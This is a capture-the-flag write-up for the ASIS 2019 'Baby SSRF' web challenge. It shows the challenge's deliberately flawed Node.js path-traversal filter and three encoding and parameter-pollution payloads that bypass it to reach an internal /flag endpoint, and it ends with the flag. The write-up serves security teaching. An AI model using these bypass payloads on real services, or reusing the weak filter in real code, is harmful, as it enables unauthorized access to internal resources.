# ASIS CTF quals - 2019

###### Contributed by k1tten
## Baby SSRF - 70 / Web


Description:
The goats thought they were safe behind the walls from the threat of the wolf!
But they were not aware of the wolf's plan to bypass the wall!


### Solution

The first hint was inside the header, and the source code can be found from it:

```
HTTP/1.1 200 OK
X-Powered-By: Express
GET: source
Content-Type: text/html; charset=utf-8
Content-Length: 22
ETag: W/"16-Ypo4AziLbHOiFWFpNXHkFH9U8Dc"
Date: Tue, 23 Apr 2019 16:55:11 GMT
Connection: close

Hi, I'm a baby ssrf :)
```

Here's the source code:

```
const express = require("express");
const body_parser = require('body-parser');
const http = require('http')
const public_s = express();
const private_s = express();
const normalizeUrl = require('normalize-url');

public_s.use(body_parser.urlencoded({
    extended: true
}));

public_s.get('/', function (request, result) {
    result.setHeader('GET', 'source')
    result.send("Hi, I'm a baby ssrf :)")
    result.end()
})

public_s.get('/source', function(req, res) {
    res.sendFile(__filename)
  })

public_s.use(function (req, res, next) {
    var err = null;
    try {
        decodeURIComponent(req.path)
    } catch (e) {
        err = e;
    }
    if (err) {
        res.sendStatus(400).end()
    }
    next();
});

public_s.post('/open/', (request, result) => {
    document_name = request.body.document_name

    if (document_name === undefined) {
        result.end('bad')
    }
    console.log('http://localhost:9000/documents/' + document_name)
    if (document_name.indexOf('.') >= 0 ||
        document_name.indexOf("2e") >= 0 ||
        document_name.indexOf("┮") >= 0 ||
        document_name.indexOf("Ｅ") >= 0 ||
        document_name.indexOf("Ｎ") >= 0) {
        result.end('Please get your banana and leave!')
    } else {
        try {
            var go_url = normalizeUrl('http://localhost:9000/documents/' + document_name)
        } catch(error) {
            var go_url = 'http://localhost:9000/documents/banana'
        }
        http.get(go_url, function (res) {
            res.setEncoding('utf8');

            if (res.statusCode == 200) {
                res.on('data', function (chunk) {
                    result.send(chunk)
                    result.end()
                });
            } else {
                result.end('Oops')
            }
        }).on('error', function (e) {
            console.log("Got error: " + e.message);
        });
    }
})

public_s.listen(8000)
private_s.listen(9000)

private_s.get('/documents/banana', function (request, result) {
    result.send("Here is your banana :D")
    result.end()
})

private_s.get('/flag', function (request, result) {
    result.send("flag{flag_is_here}")
    result.end()
})
```

Apparently we have to access `http://localhost:9000/flag` to get the flag, but some common symbols for path traversal(`.`, `2e`) were blocked, even the unicode bypass characters(`┮`, `Ｎ`) were also blocked.
(ref: Orange Tsai：[A New Era Of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

We found that it uses `normalizeUrl()` to encode unicode characters, so the unicode failure seems not working here.

```
Original:    http://localhost:9001/documents/ＮＮ
Normalized:  http://localhost:9001/documents/%EF%BC%AE%EF%BC%AE
```

(I don't know why to block the char `Ｅ` XDDDD)

After few tries on the local machine, we find it can be easily bypassed through three ways:
Triple encoding, request with `object` type.
We could even just use `%2E` because the blocking rule `%2e` was case insensitive.

```
### console.log for test ###

console.log('Original:    http://localhost:9001/documents/' + document_name)
console.log('Normalized:  ' + normalizeUrl('http://localhost:9001/documents/' + document_name))
console.log('Typeof:    ' + typeof(document_name))
console.log('indexOf(.):' + document_name.indexOf('.'))

######

#1 bypass with triple encoding
Request args：document_name_get=%25%32%45%25%32%45/flag
Origin:    http://localhost:9001/documents/%2E%2E/flag
Normalize: http://localhost:9001/flag
Typeof:    string
indexOf(.):-1

#2 bypass using different case
Request args：document_name_get=%252E%252E/flag
Origin:    http://localhost:9001/documents/%2E%2E/flag
Normalize: http://localhost:9001/flag
Typeof:    string
indexOf(.):-1

#3 bypass with object
Request args：document_name_get=foo&document_name_get=/../../flag
Origin:    http://localhost:9001/documents/foo,/../../flag
Normalize: http://localhost:9001/flag
Typeof:    object
indexOf(.):-1
```

`ASIS{68aaf2e4dd0e7ba28622aaed383bef4f}`
